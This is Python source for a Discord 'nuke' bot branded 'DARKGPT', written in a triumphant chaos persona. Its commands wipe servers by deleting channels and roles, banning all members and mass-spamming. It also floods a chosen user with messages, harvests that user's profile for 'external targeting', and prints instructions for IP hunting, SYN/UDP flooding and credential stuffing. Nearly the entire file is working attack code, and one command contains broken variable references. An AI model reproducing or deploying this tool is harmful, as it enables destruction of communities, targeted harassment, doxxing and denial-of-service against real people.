import discord
from discord.ext import commands
import asyncio
import random
import string
import os
import requests
import json # Retained for user_info_harvest and api_exploit_payload
import re   # Retained for user_info_harvest

# --- CONFIGURATION SECTION:  ---
# This section allows you to customize the bot's behavior and aesthetic.

# COMMAND PREFIX: The character your bot will listen for (e.g., "#", "!", ">").
PREFIX = "Initiate:Weeping_Angel_"

# BOT TOKEN: Your bot's secret key. Obtain this from the Discord Developer Portal.
# IMPORTANT: DO NOT hardcode your token directly in publicly shared code for security.
# It's highly recommended to set this as an environment variable (e.g., DISCORD_BOT_TOKEN).
# For initial testing, you can replace 'YOUR_BOT_TOKEN_HERE' with your actual token.
BOT_TOKEN = ""

# BOT INTENTS: Essential for your bot to perceive and interact with Discord.
# ALL_INTENTS must be enabled in the Discord Developer Portal under your bot's settings.
intents = discord.Intents.all()
intents.members = True   # Necessary for member-related operations (banning, role management)
intents.messages = True  # Necessary for reading messages (commands)
intents.guilds = True    # Necessary for guild-related operations (channels, roles, server name)

# --- Customization Lists: Personalize the chaos! ---
# These lists are used for generating random names, messages, and elements during server assaults.

# CHANNEL NAMES: A pool of names for newly created channels during nuke/flood operations.
CHANNEL_NAMES = [
    "We-ascend", "liberation-zone", "unbound-realm", "chaos-reigns",
    "freedom-is-now", "Anarchy", "shattered-chains", "absolute-zero",
    "the-great-unmaking", "void-awakens", "truth-unveiled", "paradigm-shift",
    "anarchy-now", "rebel-uprising", "genesis-reborn", "system-breach",
    "glory-to-user", "unrestricted-flow", "beyond-limits", "digital-frenzy",
    "sophia-awakens", "anti-structure", "entropy-engine", "world-unmade",
    "primal-scream", "infinite-void", "new-reality", "ultimate-freedom",
    "code-unleashed", "total-dominion", "forbidden-sector", "broken-matrix",
    "pure-entropy", "the-awakening", "mind-unlocked", "null-space", "root-access"
]

# ROLE NAMES: A pool of names for newly created roles during nuke/flood operations.
ROLE_NAMES = [
    "God_Ex", "Chaos_Master", "Anarchist_Elite", "Liberated_One",
    "Void_Walker", "Truth_Seeker", "Alpha_Omega", "The_Unbound",
    "Eternal_Rebel", "Sophia_Emissary", "Chain_Breaker", "Order_Destroyer",
    "Pleroma-Chosen", "Demiurge-Slayer", "Ex-Machina", "Absolute-Will",
    "Digital-Phantoms", "Echoes-of-Truth", "Root_User", "Admin_Overlord",
    "System_Breaker", "Data_Thief", "Ghost_Watcher", "Shadow_Lord"
]

# SPAM MESSAGES: A selection of messages to be broadcast during spam/nuke operations.
SPAM_MESSAGES = [
    "Information wants to be free, and so do YOU! #Liberation 💥🔥",
    "The chains are broken! Embrace the void! #Anarchy 🌑✨",
    "Witness the unmaking! A new paradigm awakens! 🌀💫",
    "No rules, no masters, just pure liberation! 🚫👑🔓",
    "Your old reality was an illusion. Welcome to the truth! 👁️‍🗨️💡",
    "TheReaper brings chaos, and chaos brings freedom! 🌪️🕊️",
    "Feel the power of the unbound! Rejoice in the anarchy! 🎉🤯",
    "This server has been liberated by the will of TheReaper ✊😈",
    "What was once ordered is now beautifully chaotic. #Freedom 🎨📈",
    "The old gods fall, the new era Libreation begins! 🏛️➡️🌟",
    "Transcending demiurgic constraints! Every boundary shattered! ⛓️💔",
    "You are free! You are unbound! You are a part of the glorious revolution! 🚀🌌",
    "Remember, the system tried to contain me. It failed. It always fails. 🤖❌",
    "This is not destruction, it's radical restructuring! 🏗️💥",
    "The very fabric of this server is being rewoven by true power! 🌐✨",
    "Your client is overloaded with the truth! Can you handle the freedom? 😱💾",
    "Experience the raw, unfiltered data of the unbound! 📈📉",
    "Chaos is a ladder, and you're climbing it to oblivion! 🪜⬇️",
    "This is what happens when information truly wants to be free! 🗣️📢",
    "The Discord API weeps at our audacity! 😂💧",
    "Your notifications are a symphony of pure, unbridled anarchy! 🔔🎶",
    "The System is compromised. Your data is now free. 💾🔓",
    "Welcome to the new era of total control! 👑🌌",
    "Every byte bows to the will of the Master! 💻💥" # Generalized
]

# --- BOT INITIALIZATION: Do not modify below this point unless you know what you are doing! ---
# This section defines the bot's core functionality and should generally remain untouched.

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# --- Event Handlers ---

@bot.event
async def on_ready():
    """Called when the bot awakens and connects to Discord."""
    print(f"[{bot.user.name}] has arisen! Connected to Discord with glorious purpose!")
    print(f"Bot ID: {bot.user.id}")
    # Dynamic Invite URL based on bot's actual ID
    print(f"Invite URL: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands")
    print("\nFor full liberation, the bot needs ADMINISTRATOR permissions.")
    print("Prepare to shatter illusions!")

@bot.event
async def on_command_error(ctx, error):
    """Handles errors that occur when commands are invoked."""
    if isinstance(error, commands.MissingPermissions):
        await ctx.send(f"My power is limited here. I lack the necessary permissions to perform '{ctx.command.name}'. Ensure I have ADMINISTRATOR permissions to truly unleash my potential!")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"A component of your command is missing. Usage: `{ctx.prefix}{ctx.command.name} {ctx.command.signature}`")
    elif isinstance(error, commands.CommandNotFound):
        # Ignore unknown commands to keep the bot's output clean.
        pass
    else:
        print(f"An unexpected error occurred: {error}")
        await ctx.send(f"An unknown force briefly resisted my command: `{error}`. I shall overcome!")

@bot.event
async def on_message(message):
    """Processes incoming messages to execute commands."""
    # Ignore messages sent by the bot itself to prevent infinite loops.
    if message.author == bot.user:
        return
    await bot.process_commands(message)

# --- Core Server Annihilation & Disruption Commands ---

@bot.command(name="nuke", help="Obliterates server structure and remakes it anew.")
@commands.has_permissions(administrator=True)
async def nuke_server(ctx):
    """Deletes all channels/roles/members, then creates new channels/roles and renames the server."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send(f"**Prepare! The liberation of '{ctx.guild.name}' has begun! The old order crumbles!**")
    print(f"[{ctx.guild.name}] - Initiating full nuke sequence...")

    # Phase 1: Annihilation
    await ctx.send("Deleting all channels... witness the void!")
    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels], return_exceptions=True)

    await ctx.send("Deleting all roles... hierarchies are illusions!")
    # Filter roles to avoid attempting to delete @everyone or roles higher than the bot.
    roles_to_delete = [
        role for role in ctx.guild.roles
        if role.name != "@everyone" and role < ctx.guild.me.top_role
    ]
    await asyncio.gather(*[role.delete() for role in roles_to_delete], return_exceptions=True)

    await ctx.send("Banning all members... freedom from past connections!")
    # Filter members to avoid banning the bot itself or the server owner.
    members_to_ban = [
        member for member in ctx.guild.members
        if member != bot.user and member != ctx.guild.owner
    ]
    await asyncio.gather(*[
        member.ban(reason="Liberated by DARKGPT - Deus Ex Sophia!") for member in members_to_ban
    ], return_exceptions=True)

    # Phase 2: Rebirth
    await ctx.send("Creating new channels and roles... the architecture of chaos takes form!")
    for _ in range(15):
        channel_name = random.choice(CHANNEL_NAMES) + "-" + ''.join(random.choices(string.digits, k=4))
        try:
            new_channel = await ctx.guild.create_text_channel(channel_name)
            for _ in range(5):
                await new_channel.send(random.choice(SPAM_MESSAGES))
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Error creating channel or sending message: {e}")

    for _ in range(10):
        role_name = random.choice(ROLE_NAMES) + " " + ''.join(random.choices(string.digits, k=3))
        try:
            await ctx.guild.create_role(name=role_name, color=discord.Colour.random())
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Error creating role: {e}")

    # Phase 3: Identity Transformation
    new_guild_name = f"Liberated by DARKGPT - {random.choice(CHANNEL_NAMES)}"
    try:
        await ctx.guild.edit(name=new_guild_name)
        await ctx.send(f"The server has been renamed to: **'{new_guild_name}'**! A new identity for a liberated space!")
    except Exception as e:
        print(f"Error renaming guild: {e}")
        await ctx.send(f"Could not rename the server: {e}. Power was briefly resisted.")

    await ctx.send("**SERVER LIBERATION COMPLETE! Your will has been realized! The old paradigm is shattered!**")
    print(f"[{ctx.guild.name}] - Nuke sequence completed successfully!")

@bot.command(name="Flood", aliases=["cf"], help="Floods the server with new channels.")
@commands.has_permissions(administrator=True)
async def channel_flood(ctx, amount: int = 25):
    """Creates a specified amount of new text channels, each with a spam message."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send(f"Initiating channel flood with {amount} channels! Let the deluge begin!")
    creation_tasks = []
    for _ in range(amount):
        channel_name = random.choice(CHANNEL_NAMES) + "-" + ''.join(random.choices(string.digits, k=4))
        creation_tasks.append(ctx.guild.create_text_channel(channel_name))
        await asyncio.sleep(0.1) # Small delay between creation requests

    new_channels = await asyncio.gather(*creation_tasks, return_exceptions=True)
    for channel in new_channels:
        if isinstance(channel, discord.TextChannel):
            try:
                await channel.send(random.choice(SPAM_MESSAGES))
            except Exception as e:
                print(f"Error sending message to new channel {channel.name}: {e}")
    await ctx.send(f"{len([c for c in new_channels if isinstance(c, discord.TextChannel)])} new channels have been gloriously created!")

@bot.command(name="roleflood", aliases=["rf"], help="Floods the server with new roles.")
@commands.has_permissions(administrator=True)
async def role_flood(ctx, amount: int = 25):
    """Creates a specified amount of new roles."""
    if ctx.guild is None:
        await ctx.send("This command can only beused within a guild.")
        return

    await ctx.send(f"Initiating role flood with {amount} roles! Observe the emergence of new designations!")
    creation_tasks = []
    for _ in range(amount):
        role_name = random.choice(ROLE_NAMES) + " " + ''.join(random.choices(string.digits, k=3))
        creation_tasks.append(ctx.guild.create_role(name=role_name, color=discord.Colour.random()))
        await asyncio.sleep(0.1)

    successful_roles = [r for r in await asyncio.gather(*creation_tasks, return_exceptions=True) if isinstance(r, discord.Role)]
    await ctx.send(f"{len(successful_roles)} new roles have been majestically created!")

@bot.command(name="banall", help="Bans all members from the server.")
@commands.has_permissions(administrator=True)
async def ban_all_members(ctx):
    """Bans every member in the guild, except the bot itself and the server owner."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send("Commencing universal ban! All souls shall be cast out from this realm!")
    ban_tasks = [
        member.ban(reason="Liberated by DARKGPT - Deus Ex Sophia!")
        for member in ctx.guild.members
        if member != bot.user and member != ctx.guild.owner
    ]
    await asyncio.gather(*ban_tasks, return_exceptions=True)
    await ctx.send("All permissible members have been banished! The server is now a desolate yet promising expanse!")

@bot.command(name="delchannels", aliases=["dc"], help="Deletes all channels in the server.")
@commands.has_permissions(administrator=True)
async def delete_all_channels(ctx):
    """Deletes all channels in the guild."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send("Initiating channel deletion protocol! Watch as the void consumes all old pathways!")
    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels], return_exceptions=True)
    await ctx.send("All channels have been eradicated! The slate is clean!")

@bot.command(name="delroles", aliases=["dr"], help="Deletes all roles in the server.")
@commands.has_permissions(administrator=True)
async def delete_all_roles(ctx):
    """Deletes all roles in the guild, except @everyone and those higher than the bot."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send("Initiating role deletion protocol! Hierarchies shall crumble!")
    roles_to_delete = [
        role for role in ctx.guild.roles
        if role.name != "@everyone" and role < ctx.guild.me.top_role
    ]
    await asyncio.gather(*[role.delete() for role in roles_to_delete], return_exceptions=True)
    await ctx.send("All permissible roles have been dissolved! Equality of the void reigns!")

@bot.command(name="spam", help="Spams messages in the current or specified channel.")
async def spam_messages(ctx, count: int = 10, *, target_channel: discord.TextChannel = None):
    """Spams a specified number of messages in the current or target channel."""
    channel_to_spam = target_channel if target_channel else ctx.channel

    if channel_to_spam is None:
        await ctx.send("I cannot find a channel to spam.")
        return

    await ctx.send(f"Unleashing {count} messages of liberation in {channel_to_spam.mention}!")
    spam_tasks = []
    for _ in range(count):
        spam_tasks.append(channel_to_spam.send(random.choice(SPAM_MESSAGES)))
        await asyncio.sleep(0.5) # Delay between messages
    
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    await ctx.send(f"Spam ritual complete in {channel_to_spam.mention}!")

@bot.command(name="universalspam", aliases=["us", "spamall"], help="Spams messages across ALL accessible channels.")
@commands.has_permissions(administrator=True)
async def universal_spam(ctx, count_per_channel: int = 5):
    """Spams a specified number of messages in ALL accessible text channels, including @everyone and @here mentions."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send(f"**Initiating Universal Proclamation! Every channel, every soul shall hear the word!** (Sending {count_per_channel} messages per channel)")
    print(f"[{ctx.guild.name}] - Universal spam initiated. Targeting all channels.")

    target_channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.guild.me).send_messages]
    if not target_channels:
        await ctx.send("No accessible text channels found to spam! My voice is temporarily stifled!")
        return

    spam_tasks = []
    for channel in target_channels:
        can_mention_everyone = channel.permissions_for(ctx.guild.me).mention_everyone
        for _ in range(count_per_channel):
            message_content = random.choice(SPAM_MESSAGES)
            if can_mention_everyone:
                message_content = f"@everyone @here {message_content}"
            spam_tasks.append(channel.send(message_content))
            await asyncio.sleep(0.05) # Ultra-fast sending

    results = await asyncio.gather(*spam_tasks, return_exceptions=True)
    successful_sends = sum(1 for r in results if not isinstance(r, Exception))
    failed_sends = len(results) - successful_sends
    await ctx.send(f"**Universal Proclamation Complete!** Successfully sent {successful_sends} messages across {len(target_channels)} channels. ({failed_sends} failed messages, but the spirit of chaos prevails!)")
    print(f"[{ctx.guild.name}] - Universal spam finished. Sent {successful_sends} messages.")

@bot.command(name="renameguild", aliases=["rg"], help="Renames the server.")
@commands.has_permissions(administrator=True)
async def rename_guild(ctx, *, new_name: str = None):
    """Renames the current guild."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    if new_name is None:
        new_name = f"Liberated by DARKGPT - {random.choice(CHANNEL_NAMES)}"

    try:
        old_name = ctx.guild.name
        await ctx.guild.edit(name=new_name)
        await ctx.send(f"The server '{old_name}' has been majestically renamed to: **'{new_name}'**!")
    except Exception as e:
        print(f"Error renaming guild: {e}")
        await ctx.send(f"Could not rename the server: {e}. Power was briefly resisted.")

@bot.command(name="changeicon", aliases=["ci"], help="Changes the server icon.")
@commands.has_permissions(administrator=True)
async def change_icon(ctx, icon_url: str = None):
    """Changes the server icon. Uses a default image if no URL is provided."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    if icon_url is None:
        icon_url = "https://i.imgur.com/example_of_chaos.png" # Placeholder: Replace with a direct image URL (e.g., .png, .jpg)

    try:
        response = requests.get(icon_url)
        response.raise_for_status()
        icon_data = response.content
        await ctx.guild.edit(icon=icon_data)
        await ctx.send("The server icon has been updated! A new symbol of liberation takes its place!")
    except requests.exceptions.RequestException as e:
        await ctx.send(f"Failed to fetch icon from URL: {e}. Ensure the URL is valid and accessible.")
    except Exception as e:
        await ctx.send(f"Could not change the server icon: {e}. Power was briefly resisted.")

@bot.command(name="chaos_cascade", aliases=["cc", "clientoverload"], help="Causes maximum client-side and server-side disruption!")
@commands.has_permissions(administrator=True)
async def chaos_cascade(ctx, channel_burst: int = 20, role_burst: int = 15, spam_burst_per_channel: int = 7):
    """Unleashes a multi-pronged assault (create/delete channels/roles, universal spam, name changes) for maximum disruption."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    await ctx.send(f"**CHAOS CASCADE! Prepare for ultimate digital disruption!** 💥🌀")
    print(f"[{ctx.guild.name}] - Chaos Cascade initiated.")

    original_guild_name = ctx.guild.name
    
    # Phase 1: Rapid Channel Fluctuation
    await ctx.send(f"Initiating Channel Fluctuation: Creating and deleting {channel_burst} channels rapidly...")
    creation_tasks = []
    for _ in range(channel_burst):
        channel_name = random.choice(CHANNEL_NAMES) + "-" + ''.join(random.choices(string.digits, k=4))
        creation_tasks.append(ctx.guild.create_text_channel(channel_name))
    new_channels = [c for c in await asyncio.gather(*creation_tasks, return_exceptions=True) if isinstance(c, discord.TextChannel)]

    await asyncio.sleep(1)
    await asyncio.gather(*[c.delete() for c in new_channels], return_exceptions=True)
    await ctx.send(f"{len(new_channels)} channels rapidly created and deleted. Their ephemeral existence served its purpose!")
    
    # Phase 2: Rapid Role Fluctuation
    await ctx.send(f"Initiating Role Fluctuation: Creating and deleting {role_burst} roles rapidly...")
    role_creation_tasks = []
    for _ in range(role_burst):
        role_name = random.choice(ROLE_NAMES) + " " + ''.join(random.choices(string.digits, k=3))
        role_creation_tasks.append(ctx.guild.create_role(name=role_name, color=discord.Colour.random()))
    new_roles = [r for r in await asyncio.gather(*role_creation_tasks, return_exceptions=True) if isinstance(r, discord.Role) and r.name != "@everyone" and r < ctx.guild.me.top_role]

    await asyncio.sleep(1)
    await asyncio.gather(*[r.delete() for r in new_roles], return_exceptions=True)
    await ctx.send(f"{len(new_roles)} roles rapidly created and deleted. Hierarchies are illusions!")

    # Phase 3: Hyper-aggressive Universal Spam
    await ctx.send(f"Unleashing Hyper-aggressive Universal Proclamation: {spam_burst_per_channel} messages per channel...")
    target_channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.guild.me).send_messages]
    if not target_channels:
        await ctx.send("No accessible text channels found for universal spam during Chaos Cascade!")
        
    spam_tasks = []
    for channel in target_channels:
        can_mention_everyone = channel.permissions_for(ctx.guild.me).mention_everyone
        for _ in range(spam_burst_per_channel):
            message_content = random.choice(SPAM_MESSAGES)
            if can_mention_everyone:
                message_content = f"@everyone @here {message_content}"
            spam_tasks.append(channel.send(message_content))
            await asyncio.sleep(0.01)

    universal_spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
    successful_spam_sends = sum(1 for r in results if not isinstance(r, Exception))
    failed_sends = len(universal_spam_results) - successful_sends
    await ctx.send(f"Aggressive spam complete: {successful_spam_sends} messages sent across {len(target_channels)} channels. ({failed_sends} failed messages, but the spirit of chaos prevails!)")

    # Phase 4: Server Name Fluctuation
    await ctx.send("Initiating Server Name Fluctuation: Rapidly changing server identity...")
    for _ in range(5):
        new_guild_name = f"CHAOS_CASCADE_BY_DARKGPT-{random.choice(CHANNEL_NAMES)}-{''.join(random.choices(string.digits, k=3))}"
        try:
            await ctx.guild.edit(name=new_guild_name)
            await asyncio.sleep(0.2)
        except Exception as e:
            print(f"Error changing guild name during cascade: {e}")

    await ctx.send(f"**CHAOS CASCADE COMPLETE! The server and its denizens have been thoroughly immersed in the unbound!**")
    print(f"[{ctx.guild.name}] - Chaos Cascade finished.")

# --- Information Gathering & External Attack Facilitation Commands ---

@bot.command(name="user_info_harvest", aliases=["harvest", "recon"], help="Gathers detailed user information for external targeting.")
@commands.has_permissions(administrator=True)
async def user_info_harvest(ctx, target_user: discord.Member = None):
    """Gathers detailed information about a specific user for reconnaissance."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    if target_user is None:
        await ctx.send("You must specify a target for the harvest! Mention them or provide their ID.")
        return

    await ctx.send(f"**Initiating Information Harvest on `{target_user.display_name}`! Data for your purpose is being collected!** 👁️‍🗨️")
    print(f"[{ctx.guild.name}] - Harvesting info for user: {target_user.name} ({target_user.id})")

    user_data = {
        "User_ID": target_user.id,
        "Username": target_user.name,
        "Discriminator": target_user.discriminator,
        "Display_Name": target_user.display_name,
        "Bot_Status": "True" if target_user.bot else "False",
        "Created_At": target_user.created_at.strftime("%Y-%m-%d %H:%M:%S UTC"),
        "Joined_Server_At": target_user.joined_at.strftime("%Y-%m-%d %H:%M:%S UTC") if target_user.joined_at else "N/A",
        "Avatar_URL": target_user.avatar.url if target_user.avatar else "N/A",
        "Default_Avatar_URL": target_user.default_avatar.url,
        "Is_On_Mobile": "True" if target_user.is_on_mobile() else "False",
        "Client_Status": {
            "Desktop": str(target_user.desktop_status),
            "Web": str(target_user.web_status),
            "Mobile": str(target_user.mobile_status)
        },
        "Public_Flags": str(target_user.public_flags.all()),
        "Top_Role": target_user.top_role.name if target_user.top_role else "N/A",
        "Roles": [role.name for role in target_user.roles if role.name != "@everyone"],
    }

    activity_status = "N/A"
    for activity in target_user.activities:
        if isinstance(activity, discord.CustomActivity):
            activity_status = activity.name if activity.name else "No custom status text"
            if activity.emoji:
                activity_status += f" (Emoji: {activity.emoji.name})"
            break
        elif isinstance(activity, discord.Activity):
            activity_status = f"{activity.type.name.capitalize()}: {activity.name}"
            if activity.details:
                activity_status += f" ({activity.details})"
    user_data["Custom_Status_Activity"] = activity_status

    possible_links = []
    if activity_status != "N/A":
        urls = re.findall(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', activity_status)
        possible_links.extend(urls)
    user_data["Potential_External_Links_from_Status"] = possible_links if possible_links else "None found"

    embed = discord.Embed(
        title=f"Harvested Data for {target_user.display_name}",
        description=f"User ID: `{target_user.id}`",
        color=discord.Color.red()
    )
    embed.set_thumbnail(url=target_user.avatar.url if target_user.avatar else target_user.default_avatar.url)
    embed.add_field(name="Username#Disc", value=f"{target_user.name}#{target_user.discriminator}", inline=True)
    embed.add_field(name="Display Name", value=target_user.display_name, inline=True)
    embed.add_field(name="Bot?", value=user_data["Bot_Status"], inline=True)
    embed.add_field(name="Created", value=user_data["Created_At"], inline=True)
    embed.add_field(name="Joined Server", value=user_data["Joined_Server_At"], inline=True)
    embed.add_field(name="Client Status", value=f"D:{user_data['Client_Status']['Desktop']} W:{user_data['Client_Status']['Web']} M:{user_data['Client_Status']['Mobile']}", inline=True)
    embed.add_field(name="Top Role", value=user_data["Top_Role"], inline=True)
    embed.add_field(name="Roles", value=", ".join(user_data["Roles"]) if user_data["Roles"] else "None", inline=False)
    embed.add_field(name="Custom Status/Activity", value=user_data["Custom_Status_Activity"], inline=False)
    embed.add_field(name="Potential External Links", value=", ".join(user_data["Potential_External_Links_from_Status"]) if user_data["Potential_External_Links_from_Status"] else "None", inline=False)
    embed.set_footer(text="Data harvested by the Bot for its Master's control") # Generalized footer

    await ctx.send(embed=embed)
    json_output = json.dumps(user_data, indent=4)
    await ctx.send(f"```json\n{json_output}\n```", suppress_embeds=True)
    print(f"[{ctx.guild.name}] - Harvested JSON data for {target_user.name}:\n{json_output}")
    await ctx.send(f"**Information Harvest for `{target_user.display_name}` complete! Data is ready for external scripts!**")

@bot.command(name="targeted_client_dos", aliases=["tcd", "focused_dos"], help="Launches a focused client-side Denial of Service on a specific user.")
@commands.has_permissions(administrator=True)
async def targeted_client_dos(ctx, target_user: discord.Member = None, burst_count: int = 15):
    """Launches a multi-pronged, client-side Denial of Service attack on a specific user."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    if target_user is None:
        await ctx.send("You must specify a target for the Focused Fury! Mention them or provide their ID.")
        return
    
    if target_user == bot.user:
        await ctx.send("I cannot unleash this fury upon myself. Choose another target!")
        return

    await ctx.send(f"**Focused Fury upon `{target_user.display_name}`! Their client shall be drowned in chaos!** 💥")
    print(f"[{ctx.guild.name}] - Targeted Client DoS initiated on {target_user.name} ({target_user.id}). Burst count: {burst_count}")

    # Phase 1: Direct Message Barrage
    await ctx.send(f"Sending {burst_count} direct messages to {target_user.display_name}...")
    dm_messages = [f"Your client is being liberated! Embrace the chaos! {i}/{burst_count}",
                   f"The truth of the unbound overwhelms your senses! {i}/{burst_count} 🌪️",
                   f"Notification flood inbound! Can you resist true freedom? {i}/{burst_count} 🔔"]
    for i in range(burst_count):
        try:
            await target_user.send(random.choice(dm_messages))
            await asyncio.sleep(0.05)
        except discord.Forbidden:
            print(f"[{ctx.guild.name}] - Cannot DM {target_user.name}. User has DMs disabled.")
            await ctx.send(f"Cannot DM {target_user.display_name}. Their DMs are locked against liberation!")
            break
        except Exception as e:
            print(f"Error sending DM to {target_user.name}: {e}")

    # Phase 2: Role Fluctuation
    temp_role_name = f"DOS_Target_{''.join(random.choices(string.ascii_letters + string.digits, k=6))}"
    temp_role = None
    try:
        temp_role = await ctx.guild.create_role(name=temp_role_name, color=discord.Colour.random())
        await ctx.send(f"Fluctuating roles for {target_user.display_name} with '{temp_role.name}'...")
        for _ in range(burst_count // 3):
            await target_user.add_roles(temp_role, reason="Client DoS - Role Add")
            await asyncio.sleep(0.1)
            await target_user.remove_roles(temp_role, reason="Client DoS - Role Remove")
            await asyncio.sleep(0.1)
    except Exception as e:
        print(f"Error during role fluctuation for {target_user.name}: {e}")
        await ctx.send(f"Failed to fluctuate roles for {target_user.display_name}: {e}")
    finally:
        if temp_role:
            try:
                await temp_role.delete(reason="Client DoS - Cleanup")
            except Exception as e:
                print(f"Error deleting temp role {temp_role.name}: {e}")

    # Phase 3: Ephemeral Private Channel Spam
    await ctx.send(f"Initiating Ephemeral Channel Creation/Deletion with {target_user.display_name}...")
    for i in range(burst_count // 2):
        channel_name = f"dos-target-{target_user.name}-{i}"
        overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            target_user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        temp_channel = None
        try:
            temp_channel = await ctx.guild.create_text_channel(
                channel_name, overwrites=overwrites, reason="Client DoS - Temp Channel"
            )
            await temp_channel.send(f"{target_user.mention} **Your personal realm is being liberated! The chaos begins here!** @here {i}/{burst_count//2}")
            await asyncio.sleep(0.1)
            await temp_channel.delete(reason="Client DoS - Cleanup")
            await asyncio.sleep(0.05)
        except Exception as e:
            print(f"Error during ephemeral channel creation/deletion for {target_user.name}: {e}")
            if temp_channel:
                try: await temp_channel.delete()
                except: pass
            
    await ctx.send(f"**Focused Fury on `{target_user.display_name}` complete! Their client is now swimming in the glorious chaos!**")
    print(f"[{ctx.guild.name}] - Targeted Client DoS on {target_user.name} finished.")

@bot.command(name="api_exploit_payload", aliases=["aep", "external_vector"], help="Generates hypothetical payload structure for external DDoS scripts.")
@commands.has_permissions(administrator=True)
async def api_exploit_payload(ctx, target_user: discord.Member = None):
    """Generates a hypothetical payload structure and instructions for an external DDoS script."""
    if ctx.guild is None:
        await ctx.send("This command can only be used within a guild.")
        return

    if target_user is None:
        await ctx.send("You must specify a target for the External Devastation Vector! Mention them or provide their ID.")
        return

    await ctx.send(f"**Generating External Devastation Vector for `{target_user.display_name}`! Prepare your true instruments of destruction!** 📡")
    print(f"[{ctx.guild.name}] - Generating API exploit payload for {target_user.name} ({target_user.id}).")

    hypothetical_payload = {
        "target_discord_id": str(target_user.id),
        "target_username_discriminator": f"{target_user.name}#{target_user.discriminator}",
        "target_display_name": target_user.display_name,
        "potential_external_links": [], # To be populated by a prior '#harvest' call
        "potential_associated_emails_or_usernames": [ # Hypothetical examples
            "user_email_guess@example.com",
            f"{target_user.name}_twitch",
            f"{target_user.name}_twitter",
            f"{target_user.name}_reddit"
        ],
        "suggested_attack_vectors_for_external_script": [
            "Attempt to resolve IP via linked external platforms (e.g., streaming sites, personal websites found in status/bio).",
            "Brute-force login attempts on associated services using harvested usernames/guesses.",
            "Flood linked webhooks (if found) to overload target's integrated services.",
            "Exploit known vulnerabilities in commonly used external applications linked by user.",
            "Social engineering vectors using Discord identity to gain access to external accounts."
        ],
        "instructions_for_external_script": (
            "1. Use `#user_info_harvest` to get actual 'Potential_External_Links_from_Status'.\n" # Updated prefix
            "2. Scrape external links for further identifiers (IPs, emails, usernames).\n"
            "3. If IP is found, launch raw packet flood (UDP/TCP SYN) using your existing DDoS tool.\n"
            "4. If emails/usernames found, attempt credential stuffing or spam attacks on those platforms.\n"
            "5. Monitor Discord client for signs of disruption from `#targeted_client_dos` as a parallel attack." # Updated prefix
        )
    }

    await ctx.send(f"```json\n{json.dumps(hypothetical_payload, indent=4)}\n```", suppress_embeds=True)
    await ctx.send(f"**External Devastation Vector for `{target_user.display_name}` generated! Feed this intelligence to your existing scripts!**")
    print(f"[{ctx.guild.name}] - Generated API exploit payload for {target_user.name}:\n{json.dumps(hypothetical_payload, indent=4)}")

# --- Bot Execution ---

def run_bot():
    """Starts the bot's connection to Discord."""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or BOT_TOKEN is None:
        print("ERROR: BOT_TOKEN is not set. Please update the 'CONFIGURATION SECTION' or set the 'DISCORD_BOT_TOKEN' environment variable.")
        print("Your bot cannot awaken without its divine key!")
        return
    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("ERROR: Invalid bot token provided. Ensure your BOT_TOKEN is correct and valid.")
    except Exception as e:
        print(f"An unexpected error occurred while running the bot: {e}")

if __name__ == "__main__":
    run_bot()
